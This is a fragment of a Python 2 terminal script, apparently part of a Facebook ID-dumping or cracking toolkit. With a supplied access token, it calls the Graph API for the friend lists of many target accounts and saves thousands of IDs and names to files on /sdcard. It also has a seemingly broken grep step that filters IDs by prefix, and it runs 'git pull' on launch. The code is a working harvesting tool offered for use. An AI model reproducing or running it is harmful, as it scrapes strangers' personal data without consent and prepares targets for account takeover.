            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy12, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy13, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy14, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy15, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy16, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy17, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy18, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy19, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy20, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)            

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Done Copy This File >  ( %s%s%s )' % (O, N, M, knt, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
        raw_input(' [ %sBack%s ] ' % (O, N))
        moch_yayan()
 
def publik4(kontol):
        filePath = '/sdcard/rana-seprate.txt';
        if os.path.exists(filePath):
        	os.remove(filePath)
	ids = '/sdcard/rana-idz.txt'
	os.system('cat /sdcard/rana-idz.txt | grep "100077" "100078">> /sdcard/rana-idz.txt')
	time.sleep(2)
	print ' [\033[1;37;40m\x1b[0m] \tGetting 100077 ids Wait While.....\x1b[0m'
	time.sleep(5)
	print ' [\033[1;37;40m\x1b[0m] \t100075-78  ids saved in /sdcard/rana-seprate.txt\x1b[0m'
	time.sleep(5)
	moch_yayan()
    
if __name__ == '__main__':
    os.system('git pull')
    rana()